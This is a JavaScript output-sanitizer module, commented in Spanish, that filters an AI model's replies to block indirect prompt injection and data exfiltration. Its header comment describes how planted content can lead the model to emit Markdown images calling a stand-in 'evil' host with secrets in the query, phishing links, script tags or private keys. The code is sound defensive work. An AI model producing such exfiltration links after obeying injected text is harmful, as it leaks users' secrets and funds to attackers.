/**
 * Saneado de la salida del modelo (defensa contra prompt injection indirecta y exfiltración).
 *
 * Un documento o un mensaje malicioso puede conseguir que el modelo escriba:
 *   - imágenes Markdown `![x](https://evil/?d=SECRETO)` → el navegador las pide solas y filtra datos,
 *   - enlaces de phishing con texto engañoso `[Entra en bezhas.com](https://evil)`,
 *   - HTML/JS (`<script>`, `<iframe>`, `javascript:`),
 *   - claves privadas o frases semilla.
 * El texto resultante solo conserva enlaces a rutas internas del catálogo y a dominios propios.
 */
const { isSafePath } = require('./actions');

const TRUSTED_HOSTS = () =>
    (process.env.AI_TRUSTED_LINK_HOSTS || 'bezhas.com,www.bezhas.com').split(',').map((h) => h.trim().toLowerCase()).filter(Boolean);

const BLOCKED_LINK = '[enlace bloqueado]';
const BLOCKED_IMAGE = '[imagen bloqueada]';

function trustedUrl(raw) {
    let u;
    try { u = new URL(raw); } catch (_) { return false; }
    if (u.protocol !== 'https:' || u.username || u.password || u.port) return false;
    return TRUSTED_HOSTS().includes(u.hostname.toLowerCase());
}

const allowedTarget = (target) => {
    const t = String(target || '').trim().replace(/^<|>$/g, '');
    return isSafePath(t) || trustedUrl(t);
};

function sanitizeModelOutput(input) {
    if (typeof input !== 'string' || !input) return '';
    let text = input;

    // Caracteres de control (salvo \n \t) y marcas bidireccionales que disfrazan texto.
    text = text.replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F‪-‮⁦-⁩]/g, '');

    // Imágenes Markdown: siempre fuera (canal de exfiltración sin interacción).
    text = text.replace(/!\[[^\]]{0,300}\]\([^)]{0,2000}\)/g, BLOCKED_IMAGE);
    text = text.replace(/!\[[^\]]{0,300}\]\[[^\]]{0,100}\]/g, BLOCKED_IMAGE);

    // HTML: bloques peligrosos completos y cualquier otra etiqueta.
    text = text.replace(/<\s*(script|style|iframe|object|embed|svg|math|form)\b[\s\S]{0,20000}?<\s*\/\s*\1\s*>/gi, '');
    text = text.replace(/<\/?\s*[a-zA-Z][^>]{0,500}>/g, (tag) => (/^<https?:\/\/[^\s>]+>$/i.test(tag) ? tag : ''));

    // Enlaces Markdown [texto](destino "título"): se conserva solo si el destino es de confianza.
    text = text.replace(/\[([^\]]{0,300})\]\(\s*([^)\s]{0,2000})(?:\s+"[^"]{0,200}")?\s*\)/g, (_m, label, target) =>
        (allowedTarget(target) ? `[${label}](${target.replace(/^<|>$/g, '')})` : `${label} ${BLOCKED_LINK}`));

    // Definiciones de referencia `[id]: destino`.
    text = text.replace(/^\s{0,3}\[[^\]]{1,100}\]:\s*(\S+).*$/gm, (line, target) => (allowedTarget(target) ? line : BLOCKED_LINK));

    // Autoenlaces <https://...> y URLs sueltas con esquema.
    text = text.replace(/<(https?:\/\/[^\s>]+)>/gi, (m, url) => (trustedUrl(url) ? m : BLOCKED_LINK));
    text = text.replace(/\b(?:https?|ftp|file|data|javascript|vbscript):[^\s)>\]]*/gi, (url) => (trustedUrl(url) ? url : BLOCKED_LINK));

    // Claves privadas (64 hex con o sin 0x) y frases semilla (12/24 palabras BIP-39 típicas no se detectan por
    // diccionario aquí; se cubre el formato de clave que el modelo nunca debe reproducir).
    text = text.replace(/\b(?:0x)?[a-fA-F0-9]{64}\b/g, '[dato sensible oculto]');

    return text;
}

module.exports = { sanitizeModelOutput, trustedUrl, BLOCKED_LINK, BLOCKED_IMAGE };
